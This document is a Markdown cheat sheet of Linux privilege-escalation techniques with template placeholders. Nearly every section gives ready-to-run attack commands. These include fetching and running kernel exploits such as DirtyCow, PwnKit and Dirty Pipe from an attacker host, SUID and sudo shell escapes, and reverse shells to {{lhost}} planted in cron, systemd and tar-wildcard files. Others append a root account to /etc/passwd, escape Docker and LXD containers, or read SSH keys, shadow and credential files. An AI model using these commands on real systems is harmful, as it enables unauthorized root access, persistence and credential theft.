# Élévation de privilèges - Linux

## Enumeration Scripts

```bash
# LinPEAS
wget http://{{lhost}}/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
wget http://{{lhost}}/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration
wget http://{{lhost}}/lse.sh
chmod +x lse.sh
./lse.sh -l 2

# Linux Exploit Suggester
wget http://{{lhost}}/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

## SUID/SGID

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# GTFOBins exploitation
# Check https://gtfobins.github.io/

# Common SUID exploits
/usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/nmap --interactive
/usr/bin/less /etc/shadow
/usr/bin/awk 'BEGIN {system("/bin/sh -p")}'
```

## Sudo Exploitation

```bash
# Check sudo permissions
sudo -l

# Sudo version exploit
sudo -V

# GTFOBins sudo
sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'

# LD_PRELOAD exploit
echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); }' > /tmp/shell.c
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so {{program}}

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash
```

## Kernel Exploits

```bash
# Check kernel version
uname -a
cat /proc/version

# DirtyCow (CVE-2016-5195)
wget http://{{lhost}}/dirtycow.c
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow {{password}}

# PwnKit (CVE-2021-4034)
wget http://{{lhost}}/pwnkit.c
gcc pwnkit.c -o pwnkit
./pwnkit

# Dirty Pipe (CVE-2022-0847)
wget http://{{lhost}}/dirtypipe.c
gcc dirtypipe.c -o dirtypipe
./dirtypipe /usr/bin/sudo
```

## Cron Jobs

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
crontab -u {{user}} -l

# Monitor cron execution
pspy64

# Writable cron script
echo 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1' >> /path/to/script.sh

# PATH hijacking in cron
echo '/bin/bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1' > /tmp/{{command}}
chmod +x /tmp/{{command}}
```

## Capabilities

```bash
# List capabilities
getcap -r / 2>/dev/null

# CAP_SETUID
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# CAP_DAC_READ_SEARCH
tar -czf /dev/shm/shadow.tar.gz /etc/shadow
tar -xzf /dev/shm/shadow.tar.gz
```

## NFS Privilege Escalation

```bash
# Check NFS exports
cat /etc/exports
showmount -e {{machine_ip}}

# Mount NFS share
mkdir /tmp/nfs
mount -t nfs {{machine_ip}}:/{{share}} /tmp/nfs

# Create SUID binary
echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); }' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell

# Execute on target
/shared/shell
```

## Writable /etc/passwd

```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt {{salt}} {{password}}

# Add root user
echo 'hacker:{{hash}}:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker
```

## Docker Escape

```bash
# Check if inside docker
ls -la /.dockerenv
cat /proc/1/cgroup

# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Docker socket
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container
docker run --rm -it --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
```

## LXD/LXC Privilege Escalation

```bash
# Check membership
id

# Build Alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine

# Import image
lxc image import ./alpine*.tar.gz --alias myimage

# Create privileged container
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# Access host filesystem
cd /mnt/root/root
```

## Wildcard Injection

```bash
# Tar wildcard
echo 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1' > /tmp/shell.sh
echo "" > "--checkpoint-action=exec=sh /tmp/shell.sh"
echo "" > --checkpoint=1

# Chown wildcard
echo 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1' > /tmp/shell.sh
echo "" > "--reference=/tmp/shell.sh"
```

## Environment Variables

```bash
# LD_PRELOAD
echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); }' > /tmp/shell.c
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
LD_PRELOAD=/tmp/shell.so {{suid_binary}}

# PATH hijacking
echo '/bin/bash' > /tmp/{{command}}
chmod +x /tmp/{{command}}
export PATH=/tmp:$PATH
{{vulnerable_binary}}
```

## Passwords & Keys

```bash
# Search for passwords
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

# History files
cat ~/.bash_history
cat ~/.nano_history
cat ~/.mysql_history

# Config files
cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts

# Database credentials
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
```

## Sudo Token Hijacking

```bash
# Check for sudo tokens
ps aux | grep sudo

# ptrace_scope check
cat /proc/sys/kernel/yama/ptrace_scope

# Exploit sudo token
sudo -K
sudo -v
python3 exploit.py {{pid}}
```

## Shared Object Injection

```bash
# Find missing shared objects
strace {{binary}} 2>&1 | grep -i "open"
strace {{binary}} 2>&1 | grep -i "no such file"

# Create malicious .so
echo 'void _init() { setuid(0); setgid(0); system("/bin/bash"); }' > /tmp/exploit.c
gcc -fPIC -shared -o {{missing_lib}}.so /tmp/exploit.c -nostartfiles

# Execute
{{binary}}
```

## Systemd Path Units

```bash
# Create malicious service
echo '[Unit]
Description=Exploit
[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1"
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/exploit.service

# Create path unit
echo '[Path]
PathExists=/tmp/trigger
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/exploit.path

# Enable and trigger
systemctl enable exploit.path
systemctl start exploit.path
touch /tmp/trigger
```

## Polkit (CVE-2021-3560)

```bash
# Check vulnerable version
pkaction --version

# Exploit
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:hacker string:"hacker" int32:1 & sleep 0.005s; kill $!
```

## Setuid Wrapper Exploitation

```bash
# Find wrappers
find / -name wrapper -type f 2>/dev/null

# Exploit wrapper
echo '/bin/bash' > /tmp/{{wrapped_command}}
chmod +x /tmp/{{wrapped_command}}
export PATH=/tmp:$PATH
{{wrapper}}
```

## Screen 4.5.0 (CVE-2017-5618)

```bash
# Exploit
wget http://{{lhost}}/screen-exploit.sh
chmod +x screen-exploit.sh
./screen-exploit.sh
```

## TMUX Privilege Escalation

```bash
# Find tmux sessions
tmux ls

# Attach to session
tmux attach -t {{session}}

# Check for root tmux socket
ls -la /tmp/tmux-*
```

## Writable Service Files

```bash
# Find writable service files
find /etc/systemd/system/ -writable -type f 2>/dev/null

# Modify service
echo '[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1"' >> /etc/systemd/system/{{service}}.service

# Restart service
systemctl daemon-reload
systemctl restart {{service}}
```

## Python Library Hijacking

```bash
# Check PYTHONPATH
python3 -c 'import sys; print(sys.path)'

# Create malicious module
echo 'import os; os.system("/bin/bash")' > /tmp/{{module}}.py

# Set PYTHONPATH
export PYTHONPATH=/tmp:$PYTHONPATH
python3 {{script}}.py
```